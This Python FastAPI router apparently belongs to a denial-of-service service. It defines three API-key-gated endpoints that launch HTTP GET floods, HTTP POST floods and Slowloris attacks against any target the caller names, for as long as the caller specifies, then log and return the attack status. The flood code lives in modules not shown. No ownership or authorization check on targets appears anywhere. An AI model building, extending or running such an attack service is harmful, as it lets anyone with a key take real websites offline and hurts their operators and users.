import json
from fastapi import APIRouter, Depends, Request, Response
from src.attack import Attack
from src.auth import verify_api_key
from src.denialofservice.layer7 import Layer7
from src.log import log
from src.schemas import HttpGetFloodRequest, HttpPostFloodRequest, SlowlorisFloodRequest

layer7_router = APIRouter()


@layer7_router.post("/httpGETflood")
async def http_get_flood(get_flood: HttpGetFloodRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
    try:
        api_key = request.headers.get("api-key")
        attack = Attack("Layer 7", "HTTP-GET-Flood", Layer7.http_get_flood,
                        api_key, json.loads(get_flood.json()))
        attack.start()
        log.info(
            f"{get_flood.target} HTTP-GET-FLooded from {request.client.host} for {get_flood.time} seconds")
        return Response(content=attack.get_status(), media_type="application/json", status_code=200)
    except:
        log.warning(
            f"{get_flood.target} HTTP-GET-FLood from {request.client.host} for {get_flood.time} seconds could not be triggered")
        return Response(status_code=500, content=json.dumps({"status": "HTTP-GET-Flood failed"}), media_type="application/json")


@layer7_router.post("/httpPOSTflood")
async def http_post_flood(post_flood: HttpPostFloodRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
    try:
        api_key = request.headers.get("api-key")
        attack = Attack("Layer 7", "HTTP-POST-Flood",
                        Layer7.http_post_flood, api_key, json.loads(post_flood.json()))
        attack.start()
        log.info(
            f"{post_flood.target} HTTP-POST-FLooded from {request.client.host} for {post_flood.time} seconds")
        return Response(content=attack.get_status(), media_type="application/json", status_code=200)
    except:
        log.warning(
            f"{post_flood.target} HTTP-POST-FLood from {request.client.host} for {post_flood.time} seconds could not be triggered")
        return Response(status_code=500, content=json.dumps({"status": "HTTP-POST-Flood failed"}), media_type="application/json")


@layer7_router.post("/slowloris")
async def slow_loris(slow_loris: SlowlorisFloodRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
    try:
        api_key = request.headers.get("api-key")
        attack = Attack("Layer 7", "SlowLoris", Layer7.slow_loris,
                        api_key, json.loads(slow_loris.json()))
        attack.start()
        log.info(
            f"{slow_loris.target} SLOW-Loris from {request.client.host} for {slow_loris.time} seconds")
        return Response(content=attack.get_status(), media_type="application/json", status_code=200)
    except:
        log.warning(
            f"{slow_loris.target} SlOW-Loris from {request.client.host} for {slow_loris.time} seconds could not be triggered")
        return Response(status_code=500, content=json.dumps({"status": "SlowLoris failed"}), media_type="application/json")
